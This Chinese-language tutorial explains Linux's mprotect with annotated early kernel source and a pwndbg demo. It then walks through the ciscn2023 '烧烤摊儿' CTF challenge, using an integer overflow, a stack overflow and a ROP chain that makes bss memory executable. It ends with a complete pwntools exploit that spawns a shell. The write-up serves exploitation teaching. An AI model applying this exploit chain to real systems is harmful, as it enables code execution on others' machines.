**引入**

在Linux中，mprotect函数的功能是用来设置一块内存的权限

**函数原型如下：**  
int mprotect(void * addr, size_t len, int prot)

其中变量addr代表对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限

对于prot来说，对应权限依照以下规则改变值

无法访问 即PROT_NONE：不允许访问，值为 0  
可读权限 即PROT_READ：可读，值加 1  
可写权限 即PROT_WRITE：可读， 值加 2  
可执行权限 即PROT_EXEC：可执行，值加 4

例如：我们要将某块内存区域权限设置为可读可写可执行，那么mprotect函数中prot参数便应该是1+2+4=7。

贴一下源码，方便大家理解：

    
    
    /*
     *  linux/mm/mprotect.c
     *
     *  (C) Copyright 1994 Linus Torvalds
     */
    #include <linux/stat.h>
    #include <linux/sched.h>
    #include <linux/kernel.h>
    #include <linux/mm.h>
    #include <linux/shm.h>
    #include <linux/errno.h>
    #include <linux/mman.h>
    #include <linux/string.h>
    #include <linux/malloc.h>
    
    #include <asm/segment.h>
    #include <asm/system.h>
    #include <asm/pgtable.h>
    // 修改虚拟地址address到address+size的页表项内容
    static inline void change_pte_range(pmd_t * pmd, unsigned long address,
        unsigned long size, pgprot_t newprot)
    {
        pte_t * pte;
        unsigned long end;
    
        if (pmd_none(*pmd))
            return;
        if (pmd_bad(*pmd)) {
            printk("change_pte_range: bad pmd (%08lx)\n", pmd_val(*pmd));
            pmd_clear(pmd);
            return;
        }
        // 获取一项页表项地址
        pte = pte_offset(pmd, address);
        // 屏蔽低位
        address &= ~PMD_MASK;
        // 结束地址
        end = address + size;
        // 不能超过该目录项管理的地址范围
        if (end > PMD_SIZE)
            end = PMD_SIZE;
        do {
            pte_t entry = *pte;
            if (pte_present(entry))
                // 更新页表项内容
                *pte = pte_modify(entry, newprot);
            // 下一个待处理的虚拟地址
            address += PAGE_SIZE;
            pte++;
        } while (address < end);
    }
    // 修改虚拟地址address到address+size区间的页目录项、页表项内容
    static inline void change_pmd_range(pgd_t * pgd, unsigned long address,
        unsigned long size, pgprot_t newprot)
    {
        pmd_t * pmd;
        unsigned long end;
    
        if (pgd_none(*pgd))
            return;
        if (pgd_bad(*pgd)) {
            printk("change_pmd_range: bad pgd (%08lx)\n", pgd_val(*pgd));
            pgd_clear(pgd);
            return;
        }
        // 某个页目录项
        pmd = pmd_offset(pgd, address);
        address &= ~PGDIR_MASK;
        end = address + size;
        if (end > PGDIR_SIZE)
            end = PGDIR_SIZE;
        do {
            change_pte_range(pmd, address, end - address, newprot);
            address = (address + PMD_SIZE) & PMD_MASK;
            pmd++;
        } while (address < end);
    }
    // 修改当前进程虚拟地址start到start+end区间的页目录和页表项内容
    static void change_protection(unsigned long start, unsigned long end, pgprot_t newprot)
    {
        pgd_t *dir;
        // 返回某页目录项地址 
        dir = pgd_offset(current, start);
        while (start < end) {
            // 修改某页目录项对应的页表内容
            change_pmd_range(dir, start, end - start, newprot);
            start = (start + PGDIR_SIZE) & PGDIR_MASK;
            dir++;
        }
        // 刷新快表
        invalidate();
        return;
    }
    // 设置vma的读写属性和映射方式
    static inline int mprotect_fixup_all(struct vm_area_struct * vma,
        int newflags, pgprot_t prot)
    {
        // 用户层面的属性
        vma->vm_flags = newflags;
        // 页的属性，和vm_flags存在映射关系
        vma->vm_page_prot = prot;
        return 0;
    }
    // 修改开始地址为vma->start，结束地址为end的内存属性
    static inline int mprotect_fixup_start(struct vm_area_struct * vma,
        unsigned long end,
        int newflags, pgprot_t prot)
    {
        struct vm_area_struct * n;
        // vma的flag和prot是是针对整个vma的，所以这里要切分成两个vma
        n = (struct vm_area_struct *) kmalloc(sizeof(struct vm_area_struct), GFP_KERNEL);
        if (!n)
            return -ENOMEM;
        // 复制原vma结构体内容
        *n = *vma;
        // 修改原vma的start为end，即一分为二
        vma->vm_start = end;
        // 新vma的start不变，end改成切分边界的值
        n->vm_end = end;
        // 重新计算偏移，可能超过end
        vma->vm_offset += vma->vm_start - n->vm_start;
        // 只需要设置新块的标记
        n->vm_flags = newflags;
        n->vm_page_prot = prot;
        // 多了一个vma引用文件
        if (n->vm_inode)
            n->vm_inode->i_count++;
        if (n->vm_ops && n->vm_ops->open)
            n->vm_ops->open(n);
        // 插入进程的vma结构
        insert_vm_struct(current, n);
        return 0;
    }
    // 设置开始地址为start结束地址为vma的end这片内存的属性
    static inline int mprotect_fixup_end(struct vm_area_struct * vma,
        unsigned long start,
        int newflags, pgprot_t prot)
    {
        struct vm_area_struct * n;
        // 一分为二，申请一块新的vma
        n = (struct vm_area_struct *) kmalloc(sizeof(struct vm_area_struct), GFP_KERNEL);
        if (!n)
            return -ENOMEM;
        *n = *vma;
        // start为切分边界，修改原vma的end为start
        vma->vm_end = start;
        // 新vma的start为start
        n->vm_start = start;
        // 相当于vm_offset = vm_offset - vma->start + n->vm_start,新地址加上相对偏移
        n->vm_offset += n->vm_start - vma->vm_start;
        // 只需设置新块的属性
        n->vm_flags = newflags;
        n->vm_page_prot = prot;
        // 多了一个vma引用文件
        if (n->vm_inode)
            n->vm_inode->i_count++;
        if (n->vm_ops && n->vm_ops->open)
            n->vm_ops->open(n);
        // 插入进程vma结构
        insert_vm_struct(current, n);
        return 0;
    }
    // 设置开始地址为start结束地址为end这片内存的属性
    static inline int mprotect_fixup_middle(struct vm_area_struct * vma,
        unsigned long start, unsigned long end,
        int newflags, pgprot_t prot)
    {
        struct vm_area_struct * left, * right;
        // 一分为三
        left = (struct vm_area_struct *) kmalloc(sizeof(struct vm_area_struct), GFP_KERNEL);
        if (!left)
            return -ENOMEM;
        right = (struct vm_area_struct *) kmalloc(sizeof(struct vm_area_struct), GFP_KERNEL);
        if (!right) {
            kfree(left);
            return -ENOMEM;
        }
        // 复制得到默认值
        *left = *vma;
        *right = *vma;
        // 一块的结束地址是start
        left->vm_end = start;
        // 第二块的开始地址是start，结束地址是end，start和end是用户修改属性的内存范围
        vma->vm_start = start;
        vma->vm_end = end;
        // 第三块的start是end
        right->vm_start = end;
        // 第一块不需要更新offset，第二、第三块需要更新offset，都是新开始地址+之前的相对偏移
        vma->vm_offset += vma->vm_start - left->vm_start;
        right->vm_offset += right->vm_start - left->vm_start;
        // 只需要设置第二块的属性
        vma->vm_flags = newflags;
        vma->vm_page_prot = prot;
        // 多了两个vma引用文件
        if (vma->vm_inode)
            vma->vm_inode->i_count += 2;
        if (vma->vm_ops && vma->vm_ops->open) {
            vma->vm_ops->open(left);
            vma->vm_ops->open(right);
        }
        // 插入两个vma
        insert_vm_struct(current, left);
        insert_vm_struct(current, right);
        return 0;
    }
    // 修改一个vma某个内存区间的属性
    static int mprotect_fixup(struct vm_area_struct * vma, 
        unsigned long start, unsigned long end, unsigned int newflags)
    {
        pgprot_t newprot;
        int error;
        // 不变
        if (newflags == vma->vm_flags)
            return 0;
        // 见mmap.c的protection_map，把用户层的标记转成页表项格式的值，第四位表示是否共享
        newprot = protection_map[newflags & 0xf];
        if (start == vma->vm_start)
            if (end == vma->vm_end)
                // 地址完全重合则直接覆盖vma的设置
                error = mprotect_fixup_all(vma, newflags, newprot);
            else
                // start重合则修改start到end的设置
                error = mprotect_fixup_start(vma, end, newflags, newprot);
        // 结束地址重合
        else if (end == vma->vm_end)
            error = mprotect_fixup_end(vma, start, newflags, newprot);
        else
            // 中间部分重合
            error = mprotect_fixup_middle(vma, start, end, newflags, newprot);
    
        if (error)
            return error;
        // 修改页目录、页表的内容
        change_protection(start, end, newprot);
        return 0;
    }
    // 设置start开始，大小是len的这片内存的属性为prot
    asmlinkage int sys_mprotect(unsigned long start, size_t len, unsigned long prot)
    {
        unsigned long nstart, end, tmp;
        struct vm_area_struct * vma, * next;
        int error;
        // 低12位不为0，没有页对齐，报错
        if (start & ~PAGE_MASK)
            return -EINVAL;
        // 长度是页大小的整数倍，~PAGE_MASK表示不够一页则补足一页
        len = (len + ~PAGE_MASK) & PAGE_MASK;
        // 修改的末地址
        end = start + len;
        if (end < start)
            return -EINVAL;
        // 只能设置这三个标记
        if (prot & ~(PROT_READ | PROT_WRITE | PROT_EXEC))
            return -EINVAL;
        // 没有内存需要修改
        if (end == start)
            return 0;
        // 找出地址start对应vma
        vma = find_vma(current, start);
        // 地址无效
        if (!vma || vma->vm_start > start)
            return -EFAULT;
        // 循环处理
        for (nstart = start ; ; ) {
            unsigned int newflags;
    
            /* Here we know that  vma->vm_start <= nstart < vma->vm_end. */
            /*
                (vma->vm_flags & ~(PROT_READ | PROT_WRITE | PROT_EXEC))表示清掉读写执行三个标记，
                保留其他的标记，然后再与prot。即重新设置读写执行位
            */
            newflags = prot | (vma->vm_flags & ~(PROT_READ | PROT_WRITE | PROT_EXEC));
            /*
                flag的取值见mm.h
                高四位是标记对应的属性是否可以设置。从低到高分别是可读、可写、可执行
                newflags右移四位把高四位移到第四位，四位中，置一的位说明可以设置，所以不需要校验，
                只需要校验为0的位，所以取反，置0的位变成1，如果最后与的时候非0，说明用户设置了这一位，
                则不合法。(最后&0xf说明只关注低四位。)
            */
            if ((newflags & ~(newflags >> 4)) & 0xf) {
                error = -EACCES;
                break;
            }
            // 成立的话说明用户设置的内存区间落在一个vma里，直接修改就行，否则需要修改多个vma，见下面
            if (vma->vm_end >= end) {
                error = mprotect_fixup(vma, nstart, end, newflags);
                break;
            }
            // 用户设置的end大于vma的end，所以需要设置多次
            tmp = vma->vm_end;
            // 下一个vma
            next = vma->vm_next;
            // 设置第一个vma的属性，下一轮修改下一个vma的属性
            error = mprotect_fixup(vma, nstart, tmp, newflags);
            if (error)
                break;
            // 重新设置start的值，为当前vma的end，而不是下一个vma的开始地址
            nstart = tmp;
            vma = next;
            // 下一块的start不等于nstart，即不等于上一块的end，说明不连续，用户设置的范围不合法，报错
            if (!vma || vma->vm_start != nstart) {
                error = -EFAULT;
                break;
            }
        }
        // 处理avl树
        merge_segments(current, start, end);
        return error;
    }
    

**函数效果**

下面我们用一个程序来演示mprotect函数的效果

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/mman.h>
    #include <string.h>
    
    #define heap_SIZE 4096
    
    
    int main() {
        void *heap = malloc(heap_SIZE);  // 分配堆空间
        if (heap == NULL) {
            perror("无法分配堆空间");
            return 1;
        }
        // 获取堆的页大小
        long page_size = sysconf(_SC_PAGESIZE);
        // 计算堆所在页的起始地址
        void *heap_page = (void *)((unsigned long)heap & ~(page_size - 1));
        // 修改堆的属性为可读、可写、可执行
        if (mprotect(heap_page, heap_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
            perror("无法修改堆属性");
            free(heap);
            return 1;
         }
        free(heap);
        return 0;
    }
    

编译后我们用pwndbg进行调试

![](./img/2840068766391665446.png)  
将断点下载mprotect和free处，r键运行

![](./img/1307076239744634674.png)  
当程序断在mprotect函数时用vmmap查看内存块权限  
可以看到此时heap区域只有读写权限没有执行权限

![](./img/4826655961999730306.png)

再让程序执行到free处并查看内存权限  
可以看到此时程序中多出了一块拥有rwx（即可读可写可执行）权限的堆块

![](./img/1625109920942640847.png)

此时这段rwx堆块就可以进行漏洞利用了。  
**利用姿势**

利用mprotect与read等输入函数配合修改栈或bss段权限以执行shellcode

**例题**  
**ciscn2023 烧烤摊儿**  
这道题的常规做法原本是ret2syscall构造rop链，但这道题中有mprotect函数，所以我们可以考虑利用其来修改权限来执行shellcode

ida

信息量有点大  
![](./img/2500049531161321867.png)  
pijiu函数中存在整数溢出

![](./img/9159812114528188365.png)  
输入-1溢出使money大于10000买下烧烤摊进入gaiming函数，其中有一个栈溢出漏洞  
![](./img/3425857132732306628.png)  
那么我们就可以开始构造payload以修改权限执行shellcode

首先寻找一些需要用到的函数和寄存器

    
    
    read=0x457DC0#elf.symbols['read']
    mprotect=0x458B00#elf.symbols['mprotect']
    pop_rsi=0x40a67e
    pop_rdx_rbx=0x4a404b
    pop_rdi=0x40264f
    '''
    0x00000000004050ed : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
    0x0000000000402648 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040a679 : pop r12 ; pop r13 ; pop r14 ; ret
    0x000000000049bfb3 : pop r12 ; pop r13 ; pop rbp ; ret
    0x0000000000413fbe : pop r12 ; pop r13 ; ret
    0x0000000000402aad : pop r12 ; ret
    0x00000000004050ef : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
    0x000000000040264a : pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040a67b : pop r13 ; pop r14 ; ret
    0x000000000049bfb5 : pop r13 ; pop rbp ; ret
    0x0000000000413fc0 : pop r13 ; ret
    0x00000000004050f1 : pop r14 ; pop r15 ; pop rbp ; ret
    0x000000000040264c : pop r14 ; pop r15 ; ret
    0x000000000040a67d : pop r14 ; ret
    0x00000000004050f3 : pop r15 ; pop rbp ; ret
    0x000000000040264e : pop r15 ; ret
    0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret
    0x0000000000458827 : pop rax ; ret
    0x000000000042a664 : pop rax ; ret 1
    0x0000000000402647 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040a678 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
    0x0000000000413fbd : pop rbp ; pop r12 ; pop r13 ; ret
    0x0000000000402aac : pop rbp ; pop r12 ; ret
    0x00000000004050f0 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
    0x000000000040264b : pop rbp ; pop r14 ; pop r15 ; ret
    0x000000000040a67c : pop rbp ; pop r14 ; ret
    0x000000000049bfb6 : pop rbp ; pop rbp ; ret
    0x0000000000478768 : pop rbp ; pop rbx ; ret
    0x0000000000401b01 : pop rbp ; ret
    0x000000000049bfb2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    0x0000000000489870 : pop rbx ; pop r12 ; pop r13 ; ret
    0x000000000040b536 : pop rbx ; pop r12 ; ret
    0x000000000040a677 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
    0x0000000000413fbc : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
    0x0000000000402aab : pop rbx ; pop rbp ; pop r12 ; ret
    0x0000000000404eba : pop rbx ; pop rbp ; ret
    0x0000000000402080 : pop rbx ; ret
    0x00000000004050f4 : pop rdi ; pop rbp ; ret
    0x000000000040264f : pop rdi ; ret
    0x00000000004a404b : pop rdx ; pop rbx ; ret
    0x00000000004050f2 : pop rsi ; pop r15 ; pop rbp ; ret
    0x000000000040264d : pop rsi ; pop r15 ; ret
    0x000000000040a67e : pop rsi ; ret
    0x00000000004050ee : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
    0x0000000000402649 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040a67a : pop rsp ; pop r13 ; pop r14 ; ret
    0x000000000049bfb4 : pop rsp ; pop r13 ; pop rbp ; ret
    0x0000000000413fbf : pop rsp ; pop r13 ; ret
    0x0000000000402aae : pop rsp ; ret
    0x000000000040101a : ret
    '''
    

然后先构造mprotect函数及其各个参数

    
    
    payload=b'a' * 0x20+p64(0)
    payload+=p64(pop_rdi)+p64(0x4E8000)#第一个参数addr，0x4E8000是bss段上的一块空白区域
    payload+=p64(pop_rsi)+p64(0x1000)#第二个参数len
    payload+=p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)#第三个参数prot以及函数调用
    

既然已经修改了权限，那么就需要将数据读入对应地址，所以还要构造read函数

    
    
    payload+=p64(pop_rdi)+p64(0)#read的第一个参数，0代表从用户输入的值中读取
    payload+=p64(pop_rsi)+p64(0x4E8000)#read的第二个参数，代表数据输入到的地址
    payload+=p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)#read的第三个参数输入大小和read函数调用
    payload+=p64(0x4E8000)#read函数返回地址
    

发送这个payload后再构造一个shellcode并发送执行即可getshell

完整exp：

    
    
    from pwn import*
    context(arch='amd64',log_level='debug')
    #binary = './shaokao'
    #elf=ELF('./shaokao')
    s = lambda buf: io.send(buf)
    sl = lambda buf: io.sendline(buf)
    sa = lambda delim, buf: io.sendafter(delim, buf)
    sal = lambda delim, buf: io.sendlineafter(delim, buf)
    shell = lambda: io.interactive()
    r = lambda n=None: io.recv(n)
    ra = lambda t=tube.forever:io.recvall(t)
    ru = lambda delim: io.recvuntil(delim)
    rl = lambda: io.recvline()
    rls = lambda n=2**20: io.recvlines(n)
    su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
    
    #io=remote("node2.anna.nssctf.cn",28568)
    io = process('./shaokao')
    sl(str(1))
    sl(str(1))
    sl(str(-1000000))
    
    ru("> ")
    sl(str(4))
    read=0x457DC0#elf.symbols['read']
    mprotect=0x458B00#elf.symbols['mprotect']
    pop_rsi=0x40a67e
    pop_rdx_rbx=0x4a404b
    pop_rdi=0x40264f
    #gdb.attach(p)
    ru("> ")
    sl(str(5))
    ru("请赐名：")
    payload=b'a' * 0x20+p64(0)
    payload+=p64(pop_rdi)+p64(0x4E8000)#第一个参数addr，0x4E8000是bss段上的一块空白区域
    payload+=p64(pop_rsi)+p64(0x1000)#第二个参数len
    payload+=p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)#第三个参数prot以及函数调用
    payload+=p64(pop_rdi)+p64(0)#read的第一个参数，0代表从用户输入的值中读取
    payload+=p64(pop_rsi)+p64(0x4E8000)#read的第二个参数，代表数据输入到的地址
    payload+=p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)#read的第三个参数输入大小和read函数调用
    payload+=p64(0x4E8000)
    payload=b'a'*0x20+p64(0)+p64(pop_rdi)+p64(0x4E8000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x4E8000)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)+p64(0x4E8000)
    
    sl(payload)
    shellcode=asm(shellcraft.sh())
    sl(shellcode)
    shell()
    

效果图：

![](./img/3646185403645607038.png)

